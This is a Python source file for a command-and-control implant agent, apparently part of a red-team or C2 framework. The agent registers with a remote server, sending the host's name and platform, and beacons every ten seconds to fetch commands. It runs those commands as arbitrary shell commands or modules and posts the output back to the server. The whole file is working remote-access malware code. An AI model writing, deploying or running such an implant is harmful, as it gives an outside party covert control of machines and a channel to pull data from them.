import os
import sys
import time
import json
import socket
import platform
import uuid
import requests
from datetime import datetime

# Add parent directory to path for module imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules import execute_module

class Agent:
    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.agent_id = str(uuid.uuid4())
        self.hostname = socket.gethostname()
        self.platform = platform.system()
        self.beacon_interval = 10  # seconds
        self.running = True
    
    def register(self):
        """Register with C2 server"""
        try:
            response = requests.post(
                f"{self.c2_server}/api/agent/register",
                json={
                    'agent_id': self.agent_id,
                    'hostname': self.hostname,
                    'platform': self.platform
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Registered with C2 server: {self.agent_id}")
                return True
            else:
                print(f"[-] Registration failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False
    
    def beacon(self):
        """Send beacon to C2 and get commands"""
        try:
            response = requests.post(
                f"{self.c2_server}/api/agent/{self.agent_id}/beacon",
                json={'status': 'active'},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                if commands:
                    print(f"[+] Received {len(commands)} commands")
                
                return commands
            else:
                print(f"[-] Beacon failed: {response.status_code}")
                return []
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return []
    
    def execute_command(self, command):
        """Execute a command"""
        command_id = command['id']
        module = command.get('module')
        cmd = command.get('command')
        
        print(f"[*] Executing: {module or cmd}")
        
        try:
            if module:
                # Execute security module
                result = execute_module(module)
            else:
                # Execute shell command
                import subprocess
                output = subprocess.check_output(
                    cmd,
                    shell=True,
                    timeout=60
                ).decode()
                result = {'output': output}
            
            # Send result back to C2
            self.send_result(command_id, module or 'shell', result)
            print(f"[+] Command completed: {command_id}")
            
        except Exception as e:
            error_result = {'error': str(e)}
            self.send_result(command_id, module or 'shell', error_result)
            print(f"[-] Command failed: {e}")
    
    def send_result(self, command_id, module, result):
        """Send command result to C2"""
        try:
            response = requests.post(
                f"{self.c2_server}/api/agent/{self.agent_id}/result",
                json={
                    'command_id': command_id,
                    'module': module,
                    'result': result
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Result sent for command {command_id}")
            else:
                print(f"[-] Failed to send result: {response.status_code}")
        except Exception as e:
            print(f"[-] Error sending result: {e}")
    
    def run(self):
        """Main agent loop"""
        print(f"[*] Agent starting on {self.hostname} ({self.platform})")
        print(f"[*] C2 Server: {self.c2_server}")
        
        # Register with C2
        if not self.register():
            print("[-] Failed to register, retrying in 30 seconds...")
            time.sleep(30)
            return self.run()
        
        # Main loop
        while self.running:
            try:
                # Beacon and get commands
                commands = self.beacon()
                
                # Execute commands
                for command in commands:
                    self.execute_command(command)
                
                # Sleep until next beacon
                time.sleep(self.beacon_interval)
                
            except KeyboardInterrupt:
                print("\n[*] Agent shutting down...")
                self.running = False
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                time.sleep(self.beacon_interval)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python agent_template.py <c2_server_url>")
        print("Example: python agent_template.py http://192.168.1.100:5000")
        sys.exit(1)
    
    c2_server = sys.argv[1]
    agent = Agent(c2_server)
    agent.run()
